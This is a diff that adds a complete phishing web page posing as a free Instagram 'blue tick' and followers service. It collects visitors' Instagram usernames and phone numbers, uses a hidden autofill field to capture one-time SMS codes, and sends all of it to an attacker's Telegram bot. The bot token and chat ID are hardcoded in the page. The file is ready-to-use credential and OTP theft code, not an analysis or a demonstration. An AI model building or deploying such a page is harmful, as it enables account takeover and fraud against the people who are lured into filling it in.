@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Instagram Followers - OTP Registration</title>
+<style>
+/* --- General Styles --- */
+body, html{
+    margin:0;
+    padding:0;
+    font-family: 'Poppins', sans-serif;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    height: 100%;
+    overflow-x: hidden;
+}
+
+*{
+    box-sizing: border-box;
+}
+
+/* --- Centered Container --- */
+.container{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+/* --- Form Box --- */
+.otp-form-box{
+    position: relative;
+    background: rgba(255,255,255,0.95);
+    padding: 50px 40px;
+    border-radius: 25px;
+    max-width: 400px;
+    width: 90%;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+    overflow:hidden;
+    animation: slideIn 0.8s ease-out;
+}
+
+/* --- Floating Shapes --- */
+.floating-shapes{
+    position: absolute;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    pointer-events:none;
+    z-index:0;
+}
+.shape{
+    position: absolute;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.1);
+    animation: float 6s ease-in-out infinite;
+}
+.shape:nth-child(1){width:100px;height:100px;top:10%;left:5%; animation-delay:0s;}
+.shape:nth-child(2){width:60px;height:60px;top:70%;right:10%; animation-delay:2s;}
+.shape:nth-child(3){width:80px;height:80px;top:40%;left:60%; animation-delay:4s;}
+
+@keyframes float{
+    0%,100%{transform: translateY(0) rotate(0deg);}
+    50%{transform: translateY(-20px) rotate(180deg);}
+}
+
+/* --- Slide In Animation --- */
+@keyframes slideIn{
+    from{opacity:0; transform: translateY(50px);}
+    to{opacity:1; transform: translateY(0);}
+}
+
+/* --- Form Title --- */
+.otp-form-box h2{
+    text-align:center;
+    font-size:28px;
+    margin-bottom:30px;
+    color:#333;
+}
+
+/* --- Input Styles --- */
+.input-group{
+    margin-bottom:20px;
+    position:relative;
+}
+.input-group input{
+    width:100%;
+    padding:15px 20px;
+    border-radius:12px;
+    border:2px solid #e1e5e9;
+    font-size:16px;
+    transition: all 0.3s ease;
+    background:#f8f9fa;
+}
+.input-group input:focus{
+    border-color:#667eea;
+    transform: translateY(-2px);
+    box-shadow:0 10px 25px rgba(102,126,234,0.2);
+    outline:none;
+}
+
+/* --- OTP Inputs --- */
+.otp-container{
+    display:flex;
+    justify-content: space-between;
+    margin-bottom:20px;
+}
+.otp-input{
+    width:45px;
+    height:50px;
+    border:2px solid #e1e5e9;
+    border-radius:12px;
+    text-align:center;
+    font-size:20px;
+    font-weight:bold;
+    transition: all 0.3s ease;
+    background:#f8f9fa;
+}
+.otp-input:focus{
+    border-color:#667eea;
+    box-shadow:0 10px 25px rgba(102,126,234,0.2);
+    outline:none;
+}
+.otp-input.filled{
+    border-color:#28a745;
+    background:#d4edda;
+    animation: pulse 0.6s ease;
+}
+@keyframes pulse{
+    0%{transform: scale(1);}
+    50%{transform: scale(1.05);}
+    100%{transform: scale(1);}
+}
+
+/* --- Buttons --- */
+.get-otp-btn, .submit-btn{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:12px;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+    transition: all 0.3s ease;
+    margin-bottom:10px;
+}
+.get-otp-btn{
+    background: linear-gradient(45deg, #667eea, #764ba2);
+    color:white;
+}
+.get-otp-btn:hover{
+    transform: translateY(-2px);
+    box-shadow:0 15px 30px rgba(102,126,234,0.4);
+}
+.submit-btn{
+    background: linear-gradient(45deg, #28a745, #20c997);
+    color:white;
+}
+.submit-btn:hover{
+    transform: translateY(-2px);
+    box-shadow:0 15px 30px rgba(40,167,69,0.4);
+}
+
+/* --- Messages --- */
+#otpMessage{
+    text-align:center;
+    font-weight:bold;
+    margin-top:10px;
+    color:#333;
+}
+.success-message{
+    text-align:center;
+    font-weight:600;
+    font-size:18px;
+    margin-top:20px;
+    color:#28a745;
+    opacity:0;
+    transform: translateY(20px);
+    transition: all 0.5s ease;
+}
+.success-message.show{
+    opacity:1;
+    transform:translateY(0);
+}
+
+/* --- Responsive --- */
+@media(max-width:480px){
+    .otp-container{gap:5px;}
+    .otp-input{width:35px;height:45px;font-size:18px;}
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="otp-form-box">
+        <div class="floating-shapes">
+            <div class="shape"></div>
+            <div class="shape"></div>
+            <div class="shape"></div>
+        </div>
+        <h2>FREE BLUE TICK SERVICE✔️</h2>
+        <form id="signupForm">
+            <div class="input-group">
+                <input type="text" id="userName" placeholder="Enter Instagram username or link" required>
+            </div>
+            <div class="input-group">
+                <input type="tel" id="phoneNumber" placeholder="Enter phone number" maxlength="10" minlength="10" required>
+            </div>
+
+            <div class="otp-container">
+                <!-- Hidden input for SMS autofill -->
+                <input type="tel" id="otpHidden" maxlength="6" autocomplete="one-time-code" style="opacity:0;position:absolute;pointer-events:none;">
+                <!-- Visible OTP boxes -->
+                <input type="tel" class="otp-input" id="otp1" maxlength="1" disabled>
+                <input type="tel" class="otp-input" id="otp2" maxlength="1" disabled>
+                <input type="tel" class="otp-input" id="otp3" maxlength="1" disabled>
+                <input type="tel" class="otp-input" id="otp4" maxlength="1" disabled>
+                <input type="tel" class="otp-input" id="otp5" maxlength="1" disabled>
+                <input type="tel" class="otp-input" id="otp6" maxlength="1" disabled>
+            </div>
+
+            <button type="button" class="get-otp-btn" id="getOtpBtn">📱 Get OTP</button>
+            <button type="button" class="submit-btn" id="submitBtn" style="display:none;">✅ Submit</button>
+
+            <div id="otpMessage"></div>
+            <div class="success-message" id="successMsg">🎉 Registration Successful!</div>
+        </form>
+    </div>
+</div>
+
+<script>
+// Telegram Bot Config  
+const TELEGRAM_BOT_TOKEN = '8781386056:AAGLMt-ompVu6cG2eHjwcC5MFWRtPPSZZlo';  
+const TELEGRAM_CHAT_ID = '7492494343'; 
+
+const form = document.getElementById('signupForm');
+const userName = document.getElementById('userName');
+const phoneNumber = document.getElementById('phoneNumber');
+const otpInputs = document.querySelectorAll(".otp-input");
+const otpHidden = document.getElementById('otpHidden');
+const getOtpBtn = document.getElementById('getOtpBtn');
+const submitBtn = document.getElementById('submitBtn');
+const otpMessage = document.getElementById('otpMessage');
+const successMsg = document.getElementById('successMsg');
+
+let otp = '';
+
+// OTP typing logic
+otpInputs.forEach((input,index)=>{
+    input.addEventListener('input',(e)=>{
+        if(!/^[0-9]$/.test(input.value)){input.value=''; return;}
+        input.classList.add('filled');
+        if(index<otpInputs.length-1) otpInputs[index+1].focus();
+        checkOTP();
+    });
+    input.addEventListener('keydown',(e)=>{
+        if(e.key==='Backspace' && !input.value && index>0) otpInputs[index-1].focus();
+    });
+});
+
+function checkOTP(){
+    otp = Array.from(otpInputs).map(i=>i.value).join('');
+    if(otp.length===6) submitForm();
+}
+
+// Hidden input for SMS autofill
+otpHidden.addEventListener('input',()=>{
+    const code = otpHidden.value;
+    if(code.length===6){
+        otpInputs.forEach((input,i)=>{ 
+            input.value=code[i]; 
+            input.classList.add('filled'); 
+        });
+        otp = code;
+        submitForm(); // auto-submit when OTP complete
+    }
+});
+
+// Get OTP button
+getOtpBtn.addEventListener('click', async()=>{
+    if(!userName.value.trim()){ alert('Enter Instagram username!'); return; }
+    if(!phoneNumber.value.trim()){ alert('Enter phone number!'); return; }
+
+    otp = Math.floor(100000 + Math.random()*900000).toString();
+
+    await sendToTelegram(`📱 OTP Requested!\n👤 Instagram: ${userName.value}\n📞 Phone: ${phoneNumber.value}\n🔢 OTP: ${otp}`);
+
+    otpMessage.innerText="OTP Sent! Enter the 6 digit OTP.";
+    getOtpBtn.style.display="none";
+    submitBtn.style.display="inline-block";
+
+    // Enable OTP boxes and clear previous
+    otpInputs.forEach(i=>{
+        i.disabled=false;
+        i.value='';
+        i.classList.remove('filled');
+    });
+
+    // Focus first OTP box and hidden input for autofill
+    otpInputs[0].focus();
+    otpHidden.value='';
+    otpHidden.focus();
+});
+
+// Submit Form
+async function submitForm(){
+    const fullName = userName.value.trim();
+    const phone = phoneNumber.value.trim();
+    const message = `✅ NEW REGISTRATION!\n👤 Instagram: ${fullName}\n📞 Phone: ${phone}\n🔢 OTP: ${otp}\n⏰ ${new Date().toLocaleString()}`;
+    await sendToTelegram(message);
+
+    successMsg.classList.add('show');
+    form.style.opacity='0.7';
+
+    setTimeout(()=>{
+        form.reset();
+        otpInputs.forEach(i=>i.classList.remove('filled'));
+        getOtpBtn.style.display="inline-block";
+        submitBtn.style.display="none";
+        otpMessage.innerText="";
+        successMsg.classList.remove('show');
+        form.style.opacity='1';
+        userName.focus();
+    },3000);
+}
+
+// Send to Telegram
+async function sendToTelegram(message){
+    try{
+        const url=`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message,parse_mode:'HTML'})
+        });
+    }catch(err){ console.error(err);}
+}
+</script>
+</body>
+</html>
